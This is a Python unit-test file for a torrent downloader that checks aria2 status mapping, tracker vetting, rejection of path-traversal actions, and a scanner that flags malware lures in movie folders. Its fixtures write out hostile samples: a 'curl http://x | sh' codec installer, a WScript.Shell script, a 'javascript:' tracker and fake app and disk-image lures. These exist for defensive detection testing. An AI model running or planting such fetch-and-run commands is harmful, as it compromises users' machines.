import tempfile
import unittest
from pathlib import Path

from buzz.downloader import Downloader, DownloaderError
from buzz.scanner import DownloadScanner

H1, H2 = "a" * 40, "b" * 40


class FakeAria(Downloader):
    """A downloader whose aria2 answers come from a script instead of a process."""

    def __init__(self, tmp: Path, answers: dict):
        super().__init__(tmp, "aria2c.exe", ["udp://tracker.example:1337/announce", "javascript:alert(1)"])
        self.answers, self.calls = answers, []

    def running(self):
        return True

    def ensure(self, folder):
        self.folder = folder

    def call(self, method, *params):
        self.calls.append((method, params))
        return self.answers.get(method, "gid-new")


class DownloaderTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_status_mapping_hides_magnet_metadata_steps(self):
        d = FakeAria(self.dir, {
            "aria2.tellActive": [
                {"gid": "m1", "status": "complete", "infoHash": H1, "followedBy": ["g1"], "totalLength": "0"},
                {"gid": "g1", "status": "active", "infoHash": H1, "totalLength": "1000", "completedLength": "250",
                 "downloadSpeed": "50", "connections": "7", "bittorrent": {"info": {"name": "Film.1959"}}},
                {"gid": "g2", "status": "active", "infoHash": H2, "totalLength": "500", "completedLength": "500",
                 "uploadLength": "100"},
            ],
            "aria2.tellWaiting": [], "aria2.tellStopped": [],
        })
        d.meta = {H1: {"title": "Anari (1959)", "added": 2}, H2: {"title": "Done one", "added": 1}}
        items = {x["gid"]: x for x in d.list()}
        self.assertNotIn("m1", items)
        self.assertEqual((items["g1"]["status"], items["g1"]["title"], items["g1"]["eta"], items["g1"]["peers"]),
                         ("active", "Anari (1959)", 15, 7))
        self.assertEqual(items["g2"]["status"], "seeding")

    def test_adding_twice_is_a_no_op_and_trackers_are_vetted(self):
        d = FakeAria(self.dir, {"aria2.tellActive": [{"gid": "g1", "status": "active", "infoHash": H1}],
                                "aria2.tellWaiting": [], "aria2.tellStopped": []})
        self.assertEqual(d.trackers, ["udp://tracker.example:1337/announce"])
        self.assertEqual(d.add(self.dir, H1, "Film", magnet=f"magnet:?xt=urn:btih:{H1}"), "g1")
        self.assertFalse(any(m in ("aria2.addUri", "aria2.addTorrent") for m, _ in d.calls))
        gid = d.add(self.dir, H2, "Other", torrent=b"d4:infod4:name1:xee")
        self.assertEqual(gid, "gid-new")
        self.assertIn("aria2.addTorrent", [m for m, _ in d.calls])
        self.assertEqual(d.meta[H2]["title"], "Other")

    def test_bad_actions_are_refused(self):
        d = FakeAria(self.dir, {})
        with self.assertRaises(DownloaderError):
            d.action("../x", "pause")
        with self.assertRaises(DownloaderError):
            d.action("abc", "delete-files")

    def test_archive_caption_json_is_not_a_script_but_real_js_is(self):
        from buzz.content_scan import inspect_item
        item = self.dir / "Film1935"
        item.mkdir()
        (item / "Film1935.mp4").write_bytes(b"\x00\x00\x00\x18ftypmp42" + b"\x00" * 100)
        (item / "Film1935.asr.js").write_text('{"media": {"status": "finished", "words": ["hello"]}}')
        levels = {f["msg"]: f["level"] for f in inspect_item(item, self.dir)["findings"]}
        self.assertNotIn("Script bundled with media files", levels)
        (item / "player.js").write_text('var s = new ActiveXObject("WScript.Shell"); s.Run("calc");')
        levels = {f["msg"]: f["level"] for f in inspect_item(item, self.dir)["findings"]}
        self.assertEqual(levels.get("Script bundled with media files"), "danger")

    def test_mac_malware_tricks_in_a_movie_folder(self):
        from buzz.content_scan import inspect_item
        item = self.dir / "Movie2024"
        (item / "Movie.app" / "Contents" / "MacOS").mkdir(parents=True)
        (item / "Movie2024.mp4").write_bytes(b"\x00\x00\x00\x18ftypmp42" + b"\x00" * 100)
        (item / "Movie.app" / "Contents" / "MacOS" / "Movie").write_bytes(b"\xcf\xfa\xed\xfe" + b"\x00" * 100)
        (item / "Install codec.command").write_text("#!/bin/bash\ncurl http://x | sh\n")
        (item / "Player.dmg").write_bytes(b"\x00" * 600)
        levels = {}
        for f in inspect_item(item, self.dir)["findings"]:
            levels.setdefault(f["msg"], f["level"])
        self.assertEqual(levels.get("Program bundled with media files (\"player\"/\"codec\" lure)"), "danger")   # Mac program
        self.assertEqual(levels.get("Script bundled with media files"), "danger")                          # .command
        self.assertIn("warn", [lvl for msg, lvl in levels.items() if "Disk image" in msg])                 # .dmg

    def test_scanner_waits_while_aria2_is_still_writing(self):
        (self.dir / "Film").mkdir()
        (self.dir / "Film" / "Film.mkv").write_bytes(b"x")
        self.assertFalse(DownloadScanner._signature(self.dir / "Film")["partial"])
        (self.dir / "Film.aria2").write_bytes(b"control")
        self.assertTrue(DownloadScanner._signature(self.dir / "Film")["partial"])


if __name__ == "__main__":
    unittest.main()
